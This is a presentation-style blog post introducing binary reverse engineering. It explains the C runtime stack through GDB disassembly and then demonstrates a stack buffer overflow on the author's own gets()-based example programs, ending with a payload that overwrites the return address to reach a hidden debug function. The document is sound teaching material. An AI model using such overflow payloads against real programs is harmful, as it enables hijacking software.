---
author:
  description: Software Engineer
  email: reynoldsbd3@hotmail.com
  github: https://github.com/reynoldsbd3
  image: /images/avatar-64x64.png
  name: Bobby Reynolds
cardbackground: '#263238'
cardheaderimage: /images/default.jpg
cardthumbimage: /images/default.jpg
categories:
- presentation
date: 2017-01-31T19:00:00Z
description: First steps in understanding concepts and abstractions used in binary-compiled software.
tags:
- meta
- reverse engineering
title: Introduction to Binary Reverse Engineering
---

# Introduction to Binary Reverse Engineering

#### Bobby Reynolds

---

# Abstractions

Abstractions are all over the place in software:

* Program I/O abstracted through libraries
* Memory management abstracted by GC'd languages

???

Modern software development tooling does a reasonable job of hiding technical complexity from
programmers. For example, Java programmers do not need to know about memory management in order to
be productive. This process of hiding details is known as "abstraction", and it is an extremely
powerful concept in Computer Science because it allows us to build layers upon layers of software.

However, abstraction is not without risk. Although a Java programmer need not completely understand
memory management, she must at least understand that memory exists and that it is a finite resource.
This is called a "leak" in the abstraction. Failure to understand and accommodate for a leaky
abstraction is, indeed, the root of all evil.

This lesson explores one of the oldest abstractions in modern programming: the runtime stack. This
is the method used by C (and friends) to manage the memory used by function calls. As we will see,
the runtime stack is a very leaky abstraction.

---

# Runtime Stack

What is the stack?

--

**The runtime stack is a region of memory used by computer programs to track information about the
currently running subroutines.**


--
What??

???

Here's a technical definition, but I don't think it's very practical, so I'll explain a little more.

The stack is just a big blob of memory. That part is easy enough. This region is used as a "stack"
data structure.

Each time a function in a program is called, it's given a slice of the stack, called a "frame". New
frames are added to the end of the stack as more and more functions are called. When a function
returns, its stack frame is removed from the end.

---

# Runtime Stack (Example)

Consider the following function:

```c
int func1(int a) {

    int b = 2,
        c = 7;

    b += a;
    c *= b;

    func2(c);

    return c;
}
```

???

This is a simple function, written in C. It takes one parameter, and has two local variables. Let's
explore how these local variables are represented in the stack when the function is actually called.

---

# Runtime Stack (Example)

When executed, this function will have a stack frame that looks like this:

```
             0x30        0x2C        0x28        0x24        0x20
             v           v           v           v           v
--------------------------------------------------------------------------------------
parent       |    ret    |    rbp    |     b     |     c     |       func2
stack    <-- |           |           |           |           | -->   stack
frame        |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |       frame
--------------------------------------------------------------------------------------

             |___________|
             |
          8 bytes
```

???

Let's unpack this a little bit. The first noticeable detail is that addresses are decreasing, rather
than increasing. This is counterintuitive at first, but it really doesn't matter in the end.

Second, notice the `ret` and `rbp` variables right in the middle of the stack frame. These are used
when it's time to return back to the calling function. More on this later.

Conceptually, the stack layout is pretty simple. However, let's take a look at how the stack
actually comes to be.

---

# Runtime Stack (Example)


???

For the sake of illustration, I'm going to be using this code.

(See example-00.c) This is a simple C program that does some computation and prints some output. I'm
going to build it and run it to demonstrate.

```
$ make
$ ./example-00
starting program
called func2 with 49
exiting program
```

Nothing strange happening here! Now we'll take a look at the assembly instructions and try to
understand how this program's runtime stack works.

--

Disassembling the program with GDB:

```
$ gdb ./example-00
(gdb) set disassembly-flavor intel
(gdb) disas func1
Dump of assembler code for function func1:
  0x000000000040057d <+0>:     push   rbp
  0x000000000040057e <+1>:     mov    rbp,rsp
  0x0000000000400581 <+4>:     sub    rsp,0x20
  0x0000000000400585 <+8>:     mov    DWORD PTR [rbp-0x14],edi
  0x0000000000400588 <+11>:    mov    DWORD PTR [rbp-0x4],0x2
  0x000000000040058f <+18>:    mov    DWORD PTR [rbp-0x8],0x7
  0x0000000000400596 <+25>:    mov    eax,DWORD PTR [rbp-0x14]
  0x0000000000400599 <+28>:    add    DWORD PTR [rbp-0x4],eax
  0x000000000040059c <+31>:    mov    eax,DWORD PTR [rbp-0x8]
  0x000000000040059f <+34>:    imul   eax,DWORD PTR [rbp-0x8]
  0x00000000004005a3 <+38>:    mov    DWORD PTR [rbp-0x8],eax
  0x00000000004005a6 <+41>:    mov    eax,DWORD PTR [rbp-0x8]
  0x00000000004005a9 <+44>:    mov    edi,eax
  0x00000000004005ab <+46>:    call   0x4005b5 <func2>
  0x00000000004005b0 <+51>:    mov    eax,DWORD PTR [rbp-0x8]
  0x00000000004005b3 <+54>:    leave
  0x00000000004005b4 <+55>:    ret
End of assembler dump.
```

???

These are the machine instructions executed when `func1` is called. Take a moment to chew on this,
then we'll break it down and figure out what's going on.

---

# Runtime Stack (Example)

```
0x40057d <+0>:     push   rbp                              <===
0x40057e <+1>:     mov    rbp,rsp                          <===
0x400581 <+4>:     sub    rsp,0x20                         <===
0x400585 <+8>:     mov    DWORD PTR [rbp-0x14],edi
0x400588 <+11>:    mov    DWORD PTR [rbp-0x4],0x2
0x40058f <+18>:    mov    DWORD PTR [rbp-0x8],0x7
0x400596 <+25>:    mov    eax,DWORD PTR [rbp-0x14]
0x400599 <+28>:    add    DWORD PTR [rbp-0x4],eax
0x40059c <+31>:    mov    eax,DWORD PTR [rbp-0x8]
0x40059f <+34>:    imul   eax,DWORD PTR [rbp-0x8]
0x4005a3 <+38>:    mov    DWORD PTR [rbp-0x8],eax
0x4005a6 <+41>:    mov    eax,DWORD PTR [rbp-0x8]
0x4005a9 <+44>:    mov    edi,eax
0x4005ab <+46>:    call   0x4005b5 <func2>
0x4005b0 <+51>:    mov    eax,DWORD PTR [rbp-0x8]
0x4005b3 <+54>:    leave
0x4005b4 <+55>:    ret
```

`rbp` and `rsp` are used to keep track of where the stack is at any given time.

???

The first thing a function does is set up it's own stack frame. This is done by manipulating the
`rbp` and `rsp` registers. At first, it's not very clear what's happening because assembly language
is a monster, so I'm going to go back to the stack diagram to illustrate this.

---

# Runtime Stack (Example)

```
             0x30        0x2C        0x28        0x24        0x20
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |           |           |           |
stack    <-- |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
--------------------------------------------------------------------------------------
^                        ^
rbp                      rsp
```

???

When a function is first called, the stack looks something like this. The `ret` value is already
where it needs to be, and the rest of the stack is empty.

---

# Runtime Stack (Example)

```
             0x30        0x2C        0x28        0x24        0x20
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |           |
stack    <-- |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
--------------------------------------------------------------------------------------
^                                    ^
rbp                                  rsp
```

#### Disassembly:

```asm
push   rbp
```

???

The first thing that happens is saving the value of `rbp`, because the main function would surely be
upset if we just overwrote it. This is done by "pushing" it onto the stack, which advances the stack
pointer.

---

# Runtime Stack (Example)

```
             0x30        0x2C        0x28        0x24        0x20
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |           |
stack    <-- |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
--------------------------------------------------------------------------------------
                                     ^
                                     rsp & rbp
```

#### Disassembly:

```asm
push   rbp
mov    rbp,rsp
```

???

Next, `func1` saves the current position of the stack pointer into `rbp`. This marks the starting
address of `func1`'s stack frame. Future assembly instructions can now reference local variables by
*subtracting* from the `rbp` value.

---

# Runtime Stack (Example)

```
             0x30        0x2C        0x28        0x24        0x20        0x08
             v           v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |     b     |     c     |           |
stack    <-- |           |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                                    ^
                                     rbp                                  rsp
```

#### Disassembly:

```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x20
```

???

Finally, `rsp` is manually advanced forward. Any ideas on why that is?

What if this function wants to call another function (i.e. `func2`)? Well, this whole process
repeats itself. If `rsp` still pointed to the same place as `rbp`, then things like `push rbp` would
destroy our local variables.

So, when we move `rsp` up here, we ensure that future functions can't corrupt our stack frame...

Or do we?

---

# Smashing the Stack

???

The stack is a leaky abstraction. It's easy to treat values stored on the stack as isolated, but in
reality, they are not.

Now we're going to look at an example where this abstraction leaks.

(See example-01.c) Here's another simple C program. This one requests some input from the user and
prints it back to the screen.

```
$./example-01
starting program
please enter your name:
bobby
Hello, bobby!
exiting program
```

--

Disassembly of `example-01`:

```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x20
mov    edi,0x4006a4
call   0x400480 <puts@plt>
lea    rax,[rbp-0x20]
mov    rdi,rax
call   0x4004c0 <gets@plt>
lea    rax,[rbp-0x20]
mov    rsi,rax
mov    edi,0x4006bc
mov    eax,0x0
call   0x400490 <printf@plt>
leave
ret
```

???

Notice that the prelude to this function looks much the same as the previous example in terms of
initializing a stack frame for `func1`.

---

# Smashing the Stack

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack    <-- |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
                                                 |___________|
                                                 |
                                             20 bytes
```

???

Now let's have a look at the layout of `func1`'s stack frame. The only local variable used in
`func1` is the `name` buffer, and it's `0x20` bytes long.

---

# Smashing the Stack

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack    <-- |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```

#### Disassembly:

```asm
lea    rax,[rbp-0x20]
mov    rdi,rax
call   0x4004c0 <gets@plt>
```

???

These lines call the `gets` function, passing it the address of our `name` buffer.

`gets` is a C standard library function that reads user input. I'm going to pull up the man page to
learn more about what it does with its argument.

(go look at the man page)

---

# Smashing the Stack

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack    <-- |           |           |           |    \0ybbob| -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```

#### Disassembly:

```asm
lea    rax,[rbp-0x20]
mov    rdi,rax
call   0x4004c0 <gets@plt>
```

???

So `gets` will read in whatever I type and stores it in the `name` buffer, followed by a nul-byte.

That would look like this. Notice that, since stack addresses grow backwards, my name actually fits
in from right to left on this diagram.

I wonder what happens when my input is longer than the allotted space?

```
$ ./example-01
starting program
please enter your name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
```

Interesting... Notice that the "exiting program" message didn't get printed this time. Why is that?

---

# Smashing the Stack

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA| -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```
???

Oh. That would be why.

Remember how the man page for `gets` warned that no check for buffer overrun is performed? This is
what that means. By providing input that was longer than the programmer expected we were able to
crash the program!

---

# Stack Smashing (for fun)

???

Where are we going with this? Why would anyone's name ever be "AAAAAAAAAAAAAA"? What good is it
knowing how to crash programs?

Well, let's look at yet another example.

(See example-02.c) This program is identical to the last with one small addition, a debug function
that's commented out. Well, I really really want to make that function run. Any ideas on how I can?

---

# Stack Smashing (for fun)

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack        |           |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```

???

It all revolves around that `ret` value up there. Under normal circumstances, that points back to
the main function. That way, when `func1` is done, execution picks back up where it left off in
main.

I'll demonstrate this using GDB:

```
$ gdb ./example-02
(gdb) set disassembly-flavor intel
(gdb) disassemble main
... (output elided) ...
```

Looking at this output, where do you think `func1` is going to return when it exits?

(at the time of this writing, the answer is `0x400620`)

---

# Stack Smashing (for fun)

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack        |  0x400620 |           |           |           | -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```

???

This is what we expect to find if we look at the stack frame of `func1` during execution. So, let's
set a breakpoint somewhere inside `func1` and see if that's the case.

```
(gdb) disas func1
... (output elided) ...
(gdb) b *0x4005f1
(gdb) r
... (output elided) ...
(gdb) disas
... (output elided) ...
(gdb) x/6xg $rsp
... (output elided) ...
```

(at the time of this writing, the breakpoint is `0x4005f1`)

Ok we're not crazy! Now, knowing that I can overwrite the stack (remember the "AAA"), I want to
overwrite `ret` to point to the `debug` function instead of returning to main. What's the address of
`debug`?

```
(gdb) disas debug
... (output elided) ...
```

(at the time of this writing, debug is at `0x4005f3`)

---

# Stack Smashing (for fun)

```
             0x6C        0x68        0x64        0x58        0x44
             v           v           v           v           v
--------------------------------------------------------------------------------------
main         |    ret    |    rbp    |           |    name   |
stack        |  0x4005f3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA| -->
frame        |  |  |  |  |  |  |  |  |  | ... |  |  | ... |  |
--------------------------------------------------------------------------------------
                                     ^                       ^
                                     rbp                     rsp
```

???

So why don't we try doing something like this?

```
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf3\x05\x40" | ./example-02
```
